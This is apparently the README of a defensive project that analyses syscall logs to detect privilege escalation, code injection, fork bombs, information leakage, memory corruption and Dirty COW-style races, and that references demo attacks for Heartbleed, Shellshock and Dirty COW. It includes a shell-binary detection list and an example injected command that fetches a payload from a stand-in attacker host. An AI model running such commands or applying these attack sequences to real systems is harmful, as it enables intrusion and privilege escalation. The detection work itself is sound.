# 分析脚本 ( ***To Be Expanded*** )
Scripts 下是六个 python 脚本以及对应的示例日志文件 , 分别用于检测不同的漏洞

### 0.1 HOW TO RUN
只需在 Analyzer/Scripts/XXXX 目录下用 python3 执行对应 python 脚本即可

### 0.2 OUTPUT FORMAT
```
============================================================
[!!!] High Risk Alert: Potential [Race Condition (Dirty COW-like)] vulnerability detected!
      - Process ID: 13612
      - Alert Line: 26
      - Evidence: Detected 5 madvise calls and 5 writes to /proc/self/mem in 2 seconds, exceeding threshold of (5,5)
      - Full Log Entry: {"ts": 503.5, "event": "WRITE", "pid": 13612, "filename": "/proc/self/mem", "buf": "rootpl"}
============================================================
```
```
============================================================
[!!!] Medium Risk Alert: Potential [Memory Corruption (Weak Signal)] vulnerability detected!
      - Process ID: -1
      - Alert Line: 2
      - Evidence: Detected abnormally large page allocation via mmap: 2048 pages
      - Full Log Entry: {"ts": 302, "pid": -1, "evt": "MMAP_SUM", "meta": {"count": 5, "max_pages": 2048}}
============================================================
```

### 1. AccessControl
- 检测是否有提权操作 ( PRIVILEGE_ESCALATION_EVENTS = {"SETUID", "SETGID", "SETREUID", "SETRESUID"} ) 且尝试设置uid为0 (root)
- 检测是否可能访问无权访问的文件 ( 包含 ../ 路径 , 或是在黑名单中的敏感文件 )

### 2. CodeInjection
- 检测是否使用 EXEC syscall 执行了可疑的 shell ( SUSPICIOUS_COMMANDS = { "/bin/sh", "/bin/bash", "/bin/csh", "/usr/bin/sh", "/usr/bin/bash", "sh", "bash"} )

### 3. ForkBomb
- 检测在一个时间窗口中是否出现了大量 fork 系统调用

### 4. InformationLeakage
- 检测是否在一个时间窗口中先出现了接收/读取 size 很小的数据 , 然后发送/写入 size 很大的数据

### 5. MemoryCorruption
- 强特征检测: 检测是否有 mprotect 调用 , 并将一块内存区域的权限标记为可执行 
- 弱特征检测: 检测是否有异常大的内存映射 , 但这只是一个弱特征 , 表示可能存在大的内存分配 , 而非确切的攻击行为

### 6. RaceCondition
- 检测是否有高频、并发地调用 mmap , madvise , 和 write ( 针对 /proc/self/mem ) , 具体原理见下文

---

# 恶意代码示例
MaliciousCode 下是三个典型的高危漏洞 
### Heartbleed
- 这是一个边界检查缺失导致的信息泄露漏洞。攻击者可以向服务器发送一个特制的心跳请求，请求一块很大的内存（比如64KB），但实际只发送了很小的数据。有漏洞的服务器不会检查请求长度和实际数据长度是否匹配，直接从内存中复制并返回64KB数据，这其中就可能包含服务器的私钥、用户会话、密码等敏感信息。
- Heartbleed触发时的序列:

  1. 服务器进程通过 read()/recvfrom() 接收到攻击者发来的恶意心跳包。

  2. OpenSSL库在内存中处理这个包时，由于逻辑缺陷，会读取到不该读取的内存区域。

  3. 服务器最终通过 write()/sendto() 将这块包含敏感信息的内存区域发送回攻击者。

### Shellshock
- 这是一个命令注入漏洞。Bash在处理某些特殊构造的环境变量时，会错误地将环境变量值中的字符串作为命令来执行。当一个程序（如网页服务器的CGI脚本）接收用户输入并将其设置为环境变量，然后调用Bash时，攻击者就可以远程执行任意命令。<br><br>由于 bash 问题已被修复 ，可能需要旧版本的 docker 才能正确演示

- Shellshock触发时的序列:

    1. Apache进程通过 read() 接收到一个包含恶意HTTP头的请求。

    2. Apache fork() 并准备通过 execve() 运行CGI脚本。在调用 execve() 之前，它会将HTTP头（如User-Agent）设置为环境变量。

    3. execve() 成功执行，Bash进程启动。

    4. Bash在初始化、解析环境变量时，触发了漏洞。

    5. 关键点: Bash进程内部会再次调用 fork() 和 execve() 来执行攻击者注入的命令（例如 /bin/sh -c 'wget http://attacker.com/payload'）。

### Dirty COW
- 这是一个Linux内核的竞争条件漏洞，允许本地低权限用户提权至root。漏洞在于内核内存子系统处理写时复制（Copy-on-Write, COW）机制时存在缺陷。攻击者可以利用这个缺陷，向一个只读的内存映射（例如一个由root拥有的文件 /etc/passwd）写入数据。 <br><br> ***警告***：请务必在专门的、可丢弃的虚拟机或Docker容器中运行此代码。虽然此PoC是本地的，但它利用的是内核级漏洞，在不安全的系统上运行可能导致系统不稳定。
- Dirty COW触发时的序列:

    1. 攻击者进程使用 mmap() 将一个只读文件（如 /etc/passwd）映射到内存中。

    2. 进程创建两个线程。

    3. 线程A: 在一个循环中，反复调用 madvise(addr, len, MADV_DONTNEED)。这个调用告诉内核“我不再需要这块内存了”，内核会丢弃它，但保留映射关系。下次访问时会重新从文件加载（触发COW）。

    4. 线程B: 同时，在另一个循环中，通过 open("/proc/self/mem", O_RDWR) 并 lseek() 到目标内存地址，然后 write() 尝试向这块只读映射写入数据。